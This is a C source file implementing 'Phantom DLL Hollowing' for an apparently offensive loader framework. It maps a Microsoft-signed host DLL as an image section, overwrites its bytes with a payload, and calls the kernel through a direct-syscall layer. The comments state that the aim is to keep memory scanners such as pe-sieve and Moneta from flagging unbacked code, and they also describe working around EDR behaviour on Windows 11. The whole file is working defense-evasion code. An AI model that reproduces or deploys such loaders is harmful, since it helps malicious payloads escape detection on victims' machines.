/*
 * src/mapping/map_phantom.c
 *
 * Phantom DLL Hollowing mapping strategy.
 *
 * Pipeline:
 *  1. Pick a Microsoft-signed host DLL whose on-disk size >= payload.
 *  2. Open the host file with read+execute share rights.
 *  3. NtCreateSection(SEC_IMAGE, host_handle) - the kernel parses the
 *  host's PE headers and synthesizes an image section with proper
 *  per-section permissions (.text RX, .rdata R, .data RW, etc.).
 *  4. NtMapViewOfSection - map the whole image read-only-as-needed.
 *  The OS picks a base that respects ASLR; the size is the host's
 *  SizeOfImage.
 *  5. Hand the base back to the loader as if it were a normal
 *  reservation. The loader copies our payload over the host's
 *  bytes (PAGE_EXECUTE_WRITECOPY pages CoW transparently on write,
 *  keeping the MEM_IMAGE classification on most pages).
 *  6. ph_protect flips per-section to our payload's intended
 *  permissions exactly like the private_rwx strategy does.
 *  7. ph_release unmaps the view, closes the section, and closes
 *  the file.
 *
 * IOC neutralised: pe-sieve / Moneta / hollows_hunter classify the
 * region as "Image" (backed by a real on-disk file), so the
 * "implanted PE / unbacked code" detector does not fire.
 *
 * Residual IOC: the .text content does not match the host's hash on
 * disk (we overwrote it). Tools that compare in-memory bytes against
 * the file image (Cylance, ESET advanced) still detect.
 */

#include "core/wr_context_internal.h"
#include "core/wr_ptr_check.h"
#include "mapping/map_phantom_host_picker.h"
#include "mapping/map_strategy.h"
#include "wraith/wraith_options.h"
#include "pe/pe_constants.h"
#include "runtime/rt_api.h"
#include "syscalls/sc_engine.h"

#include <stdlib.h>
#include <windows.h>
#include <winternl.h>

typedef struct phantom_state {
  HANDLE  section;
  HANDLE  file;
  void  *view_base;
  SIZE_T  view_size;
  wchar_t host_path[MAX_PATH];
} phantom_state;

#ifndef SEC_IMAGE
#  define SEC_IMAGE 0x01000000
#endif
#ifndef SECTION_ALL_ACCESS
#  define SECTION_ALL_ACCESS 0xF001F
#endif
#ifndef ViewUnmap
#  define ViewUnmap 2
#endif

static wraith_status_t ph_reserve(struct wr_ctx *ctx, size_t needed_size,
  void **out_base)
{
  if (!ctx || !out_base) {
  return WRAITH_E_NULL_ARG;
  }

  /* Engine init is required: phantom relies on NtCreateSection +
  * NtMapViewOfSection going through the runtime layer. */
  if (wr_sc_engine_init() != WRAITH_OK) {
  return wr_ctx_fail(ctx, WRAITH_E_SC_INVOKE_FAILED,
  "phantom: syscall engine init failed");
  }

  phantom_state *st = (phantom_state *)calloc(1, sizeof(phantom_state));
  if (!st) {
  return wr_ctx_fail(ctx, WRAITH_E_OOM, "phantom: alloc state");
  }

  /* Pick a host DLL. wr_ctx_create copies opt->host_dll into
  * ctx->phantom_host_path (when wraith_load_options provided one);
  * otherwise the curated picker fires. Validate the stored pointer
  * before passing it to the picker - a stomped value would lead the
  * picker to deref garbage in `preferred[0]`. */
  const wchar_t *preferred = NULL;
  if (wr_looks_like_valid_base(ctx->phantom_host_path)) {
  preferred = ctx->phantom_host_path;
  }

  wraith_status_t rc = wr_phantom_pick_host(needed_size, preferred,
  st->host_path,
  sizeof(st->host_path) /
  sizeof(st->host_path[0]));
  if (rc != WRAITH_OK) {
  free(st);
  return wr_ctx_fail(ctx, WRAITH_E_MAP_NO_HOST_DLL,
  "phantom: no host DLL >= %zu bytes",
  needed_size);
  }

  /* Open host with read+execute. We deliberately omit FILE_SHARE_DELETE:
  * some EDRs on Win11 24H2 reject NtCreateSection(SEC_IMAGE) when the
  * underlying file handle was opened with share-delete, returning
  * STATUS_INVALID_PAGE_PROTECTION via a misleading code path. */
  st->file = CreateFileW(st->host_path, GENERIC_READ | GENERIC_EXECUTE,
  FILE_SHARE_READ, NULL,
  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (st->file == INVALID_HANDLE_VALUE) {
  free(st);
  return wr_ctx_fail(ctx, WRAITH_E_MAP_NO_HOST_DLL,
  "phantom: CreateFileW failed: 0x%08lx",
  (unsigned long)GetLastError());
  }

  /* Create SEC_IMAGE section backed by the host file.
  *
  * DesiredAccess: SECTION_ALL_ACCESS - canonical (Forrest Orr,
  * LdrLoadDll internal). Earlier hypotheses about SECTION_MAP_WRITE
  * being incompatible with SEC_IMAGE proved incorrect on real Win11.
  *
  * SectionPageProtection: the kernel's MiCreateImageFileMap accepts
  * different values depending on Windows version + HVCI/CIG state.
  * No single value works everywhere on Win11 24H2, so we walk a
  * retry chain in canonical-first order:
  *
  *   PAGE_READONLY            (Forrest Orr / Hells Gate canonical)
  *   PAGE_EXECUTE             (Microsoft LdrLoadDll internal)
  *   PAGE_EXECUTE_READ        (older Win10 / pre-hardening)
  *   PAGE_EXECUTE_WRITECOPY   (ProcessHacker KphCreateSection)
  *
  * Only STATUS_INVALID_PAGE_PROTECTION (0xC00000F4) triggers a
  * retry; any other NTSTATUS indicates a different problem (file
  * access, signing policy, etc.) and we surface it as-is. */
  static const ULONG kProtAttempts[] = {
  PAGE_READONLY,
  PAGE_EXECUTE,
  PAGE_EXECUTE_READ,
  PAGE_EXECUTE_WRITECOPY,
  };
  NTSTATUS s = (NTSTATUS)0xC00000F4;  /* sentinel = INVALID_PAGE_PROTECTION */
  ULONG  used_prot = 0;
  for (size_t pi = 0; pi < sizeof(kProtAttempts) / sizeof(kProtAttempts[0]); ++pi) {
  used_prot = kProtAttempts[pi];
  s = wr_sc_call_NtCreateSection(
  &st->section, SECTION_ALL_ACCESS, NULL, NULL,
  used_prot, SEC_IMAGE, st->file);
  if (s == 0) {
  break;            /* success */
  }
  if ((unsigned)s != 0xC00000F4u) {
  break;            /* different error - don't keep retrying */
  }
  /* Otherwise: STATUS_INVALID_PAGE_PROTECTION - try next prot. */
  }
  if (s != 0) {
  CloseHandle(st->file);
  free(st);
  return wr_ctx_fail(ctx, WRAITH_E_MAP_RESERVE_FAILED,
  "phantom: NtCreateSection NTSTATUS=0x%08x "
  "(last protection tried: 0x%lx)",
  (unsigned)s, (unsigned long)used_prot);
  }

  /* Map the section. The kernel chooses an ASLR base; size in/out is
  * 0 -> "use the section's full size" (host's SizeOfImage). */
  void  *base = NULL;
  SIZE_T view_sz = 0;
  s = wr_sc_call_NtMapViewOfSection(
  st->section, (HANDLE)-1, &base, 0, 0, NULL, &view_sz,
  ViewUnmap, 0, PAGE_EXECUTE_READ);
  if (s != 0 || !wr_looks_like_valid_base(base)) {
  wr_sc_call_NtClose(st->section);
  CloseHandle(st->file);
  free(st);
  return wr_ctx_fail(ctx, WRAITH_E_MAP_RESERVE_FAILED,
  "phantom: NtMapViewOfSection NTSTATUS=0x%08x base=%p",
  (unsigned)s, base);
  }

  /* Confirm the kernel actually mapped a backed region. Some EDR
  * implementations on Win11 24H2 return STATUS_SUCCESS for hooked
  * NtMapViewOfSection without producing a real mapping; the next
  * deref of `base` then faults at base+small_offset. VirtualQuery
  * at this stage is cheap and forces the kernel to confirm the
  * region exists. */
  {
  MEMORY_BASIC_INFORMATION mbi = {0};
  SIZE_T q = VirtualQuery(base, &mbi, sizeof(mbi));
  if (q == 0 || mbi.State != MEM_COMMIT || mbi.BaseAddress != base) {
  wr_sc_call_NtUnmapViewOfSection((HANDLE)-1, base);
  wr_sc_call_NtClose(st->section);
  CloseHandle(st->file);
  free(st);
  return wr_ctx_fail(ctx, WRAITH_E_MAP_RESERVE_FAILED,
  "phantom: post-map VirtualQuery failed "
  "(q=%zu state=0x%lx)",
  (size_t)q, (unsigned long)mbi.State);
  }
  }

  if (view_sz < needed_size) {
  wr_sc_call_NtUnmapViewOfSection((HANDLE)-1, base);
  wr_sc_call_NtClose(st->section);
  CloseHandle(st->file);
  free(st);
  return wr_ctx_fail(ctx, WRAITH_E_MAP_HOST_TOO_SMALL,
  "phantom: host SizeOfImage=%zu < payload=%zu",
  (size_t)view_sz, needed_size);
  }

  /* SEC_IMAGE pages are mapped with the host's per-section permissions
  * (e.g. PAGE_EXECUTE_READ for .text, PAGE_READONLY for headers).
  * The loader needs the entire region writable so memcpy works
  * during CopySections + relocations. We flip the whole view to
  * PAGE_READWRITE up-front; FinalizeSections later restores the
  * payload's intended per-section protections. */
  {
  PVOID  flip_addr = base;
  SIZE_T flip_sz  = view_sz;
  ULONG  oldp = 0;
  NTSTATUS sf = wr_sc_call_NtProtectVirtualMemory(
  (HANDLE)-1, &flip_addr, &flip_sz, PAGE_READWRITE, &oldp);
  if (sf != 0) {
  wr_sc_call_NtUnmapViewOfSection((HANDLE)-1, base);
  wr_sc_call_NtClose(st->section);
  CloseHandle(st->file);
  free(st);
  return wr_ctx_fail(ctx, WRAITH_E_MAP_PROTECT_FAILED,
  "phantom: bulk RW flip NTSTATUS=0x%08x",
  (unsigned)sf);
  }
  }

  st->view_base = base;
  st->view_size = view_sz;
  ctx->map_state = st;
  ctx->phantom_section = st->section;

  *out_base = base;
  return WRAITH_OK;
}

static wraith_status_t ph_commit(struct wr_ctx *ctx, void *addr, size_t size,
  wraith_prot_t initial_prot)
{
  /* SEC_IMAGE pages are PAGE_EXECUTE_WRITECOPY (or equivalent for
  * .data) - writes trigger CoW. We make our payload's section ranges
  * RW first so the loader's memcpy generates clean private pages,
  * then ph_protect finalizes to RX/R/RW. */
  if (!ctx || !addr || size == 0) {
  return WRAITH_E_NULL_ARG;
  }
  unsigned prot = wr_prot_to_win32(initial_prot ? initial_prot : WRAITH_PROT_RW);
  if (!prot) {
  return wr_ctx_fail(ctx, WRAITH_E_MAP_RWX_LEAK,
  "phantom: rejected RWX in commit");
  }
  unsigned old = 0;
  int rc = ctx->rt_ops->nt_protect(addr, size, prot, &old);
  if (rc != 0) {
  return wr_ctx_fail(ctx, WRAITH_E_MAP_COMMIT_FAILED,
  "phantom: NtProtect(commit) -> 0x%x",
  (unsigned)rc);
  }
  return WRAITH_OK;
}

static wraith_status_t ph_protect(struct wr_ctx *ctx, void *addr, size_t size,
  wraith_prot_t new_prot)
{
  /* Identical to private_rwx: route through rt_ops->nt_protect. */
  if (!ctx || !addr || size == 0 || !ctx->rt_ops) {
  return WRAITH_E_NULL_ARG;
  }
  unsigned w32 = wr_prot_to_win32(new_prot);
  if (!w32) {
  return wr_ctx_fail(ctx, WRAITH_E_MAP_RWX_LEAK,
  "phantom: rejected RWX in protect");
  }

  unsigned old = 0;
  int rc = ctx->rt_ops->nt_protect(addr, size, w32, &old);
  if (rc != 0) {
  return wr_ctx_fail(ctx, WRAITH_E_MAP_PROTECT_FAILED,
  "phantom: NtProtect(0x%p,%zu,0x%x) -> 0x%x",
  addr, size, w32, (unsigned)rc);
  }

  if (new_prot & (WRAITH_PROT_RX | WRAITH_PROT_RXC)) {
  ctx->rt_ops->nt_flush_icache(addr, size);
  }
  return WRAITH_OK;
}

static wraith_status_t ph_release(struct wr_ctx *ctx)
{
  if (!ctx) {
  return WRAITH_E_NULL_ARG;
  }
  phantom_state *st = (phantom_state *)ctx->map_state;
  if (!st) {
  return WRAITH_OK;
  }
  if (st->view_base) {
  wr_sc_call_NtUnmapViewOfSection((HANDLE)-1, st->view_base);
  st->view_base = NULL;
  }
  if (st->section) {
  wr_sc_call_NtClose(st->section);
  st->section = NULL;
  }
  if (st->file && st->file != INVALID_HANDLE_VALUE) {
  CloseHandle(st->file);
  st->file = NULL;
  }
  return WRAITH_OK;
}

static void ph_destroy(struct wr_ctx *ctx)
{
  if (!ctx) {
  return;
  }
  free(ctx->map_state);
  ctx->map_state = NULL;
}

const struct wr_map_ops wr_map_ops_phantom = {
  .name  = "phantom_hollow",
  .reserve = ph_reserve,
  .commit  = ph_commit,
  .protect = ph_protect,
  .release = ph_release,
  .destroy = ph_destroy,
};
